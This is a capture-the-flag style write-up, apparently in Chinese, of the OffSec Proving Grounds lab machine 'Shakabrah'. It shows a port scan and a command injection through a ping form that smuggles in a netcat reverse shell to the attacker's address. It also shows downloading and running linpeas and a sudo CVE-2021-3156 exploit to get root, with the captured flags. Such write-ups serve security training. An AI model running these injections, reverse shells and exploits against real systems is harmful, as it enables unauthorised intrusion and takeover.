###### tags: `Offsec` `PG Play` `Easy` `Linux`

# Shakabrah
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.217.86 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.217.86:22
Open 192.168.217.86:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`http://192.168.217.86/`有一個ping的欄位，他會執行ping指令，直接看能不能執行reverse
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp80 

192.168.45.192; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.192 80 >/tmp/f
```

等反彈，可在`/home/dylan`得local.txt
```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@shakabrah:/home/dylan$ cat local.txt
dd293ba0609080c8480d04fea95513cd
```

`linpeas.sh`
```
www-data@shakabrah:/tmp$ wget 192.168.45.192/linpeas.sh
www-data@shakabrah:/tmp$ chmod +x linpeas.sh
www-data@shakabrah:/tmp$ ./linpeas.sh

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
```

用[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)得root，在/root得proof.txt
```
www-data@shakabrah:/tmp$ wget 192.168.45.192/exploit_nss.py
www-data@shakabrah:/tmp$ python3 exploit_nss.py

# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@shakabrah:/root# cat proof.txt
1693be561af0aba1481e48fd86592fd3
```